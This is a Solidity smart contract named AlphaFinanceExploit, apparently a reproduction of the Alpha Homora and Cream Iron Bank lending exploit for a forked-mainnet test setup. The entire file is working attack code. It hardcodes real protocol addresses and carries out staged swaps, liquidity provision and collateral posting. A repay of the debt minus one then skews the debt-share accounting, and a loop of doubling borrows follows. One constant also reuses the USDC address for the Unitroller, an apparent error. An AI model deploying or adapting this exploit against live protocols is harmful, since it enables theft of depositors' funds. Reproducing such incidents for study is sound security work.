// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import "openzeppelin/token/ERC1155/IERC1155Receiver.sol";

import "forge-std/console.sol";

interface IRouter {
    // uniswap v2 router interface
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ICERC20 is IERC20 {
    function mint(uint mintAmount) external returns (uint);
}

interface IUnitroller {
    function enterMarkets(
        address[] calldata cTokens
    ) external returns (uint[] memory);
}

interface IHomoraBank {
    function execute(
        uint positionId,
        address spell,
        bytes memory data
    ) external payable returns (uint);

    function borrow(address token, uint amount) external;

    function putCollateral(
        address collToken,
        uint collId,
        uint amountCall
    ) external;

    function POSITION_ID() external returns (uint256);

    function accrue(address token) external;

    function getPositionDebts(
        uint256 positionId
    ) external returns (address[] memory tokens, uint256[] memory debts);

    function repay(address token, uint amountCall) external;

    function getBankInfo(
        address token
    )
        external
        returns (
            bool isListed,
            address cToken,
            uint reserve,
            uint totalDebt,
            uint totalShare
        );

    function getPositionDebtShareOf(
        uint positionId,
        address token
    ) external view returns (uint);

    function resolveReserve(address token) external;
}

interface IWERC20 {
    function mint(address token, uint amount) external;

    function setApprovalForAll(address, bool) external;
}

contract AlphaFinanceExploit {
    IRouter constant uniswapV2Router02 =
        IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 constant uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant susd = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUnitroller constant ironBankUnitroller =
        IUnitroller(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICERC20 constant cySusd =
        ICERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
    IHomoraBank constant homoraBank =
        IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    IERC20 constant uniPairLPToken =
        IERC20(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
    IWERC20 constant werc20 =
        IWERC20(0xe28D9dF7718b0b5Ba69E01073fE82254a9eD2F98);

    uint256 positionId;

    fallback() external payable {}

    function step2() external payable {
        // 1 swaps ETH -> UNI
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(uni);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(
            1,
            path,
            address(this),
            1613195981
        );

        // 2 supply ETH + UNI to Uniswap pool
        uni.approve(address(uniswapV2Router02), type(uint256).max);
        uint256 uniAmount = uni.balanceOf(address(this));
        uniswapV2Router02.addLiquidityETH{value: 0.5 ether}(
            address(uni),
            uniAmount,
            1,
            1,
            address(this),
            1613195981
        );

        // 3 swap ETH -> sUSD
        path[1] = address(susd);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(
            1,
            path,
            address(this),
            1613195981
        );

        // 4 deposit sUSD to Creamâ€™s Iron Bank (getting cysUSD)
        susd.approve(address(cySusd), type(uint256).max);
        uint256 susdAmount = susd.balanceOf(address(this));
        require(susdAmount > 894386566919930349147, "susd amount not enough");
        cySusd.mint(894386566919930349147);
    }

    function step3() external {
        // 1 borrow susd
        positionId = homoraBank.POSITION_ID();
        console.log("LP Token %s", uniPairLPToken.balanceOf(address(this)));
        homoraBank.borrow(address(susd), 1000000000000000000000);
        uint256 susdAmount = susd.balanceOf(address(this));
        require(susdAmount > 0, "borrow not success");

        // 2  put lp token as collacteral before homora bank's check
        uint256 lpTokenAmount = uniPairLPToken.balanceOf(address(this));
        uniPairLPToken.approve(address(werc20), type(uint256).max);
        werc20.mint(address(uniPairLPToken), lpTokenAmount);
        werc20.setApprovalForAll(address(homoraBank), true);
        homoraBank.putCollateral(
            address(werc20),
            1209299932290980665713177030673858520201944054295,
            lpTokenAmount
        );
    }

    function step4() external {
        // 1 repay debt - 1
        homoraBank.accrue(address(susd));
        (address[] memory tokens, uint256[] memory debts) = homoraBank
            .getPositionDebts(positionId);
        uint256 repayAmount = debts[0] - 1;
        susd.approve(address(homoraBank), type(uint256).max);
        homoraBank.repay(address(susd), repayAmount);
    }

    function step6(uint256 _n) external {
        // borrow totalDebt - 1
        (, , , uint totalDebt, ) = homoraBank.getBankInfo(address(susd));
        uint256 borrowAmount = totalDebt - 1;

        for (uint i = 0; i < _n; i++) {
            // if (i == _n - 1) {
            console.log(borrowAmount);
            // }

            homoraBank.borrow(address(susd), borrowAmount);
            borrowAmount += borrowAmount;
        }
        uint256 bal = susd.balanceOf(address(this)); //21881436807390184302

        console.log("susd BalanceOf after step6 = %s", bal);
        cySusd.mint(bal);
    }

    function msgSenderAndTxOrigin() external {
        console.log("msg.sender = %s", msg.sender);
        console.log("tx.origin = %s", tx.origin);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    /**
     * @notice IERC1155Receiver
     */
    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
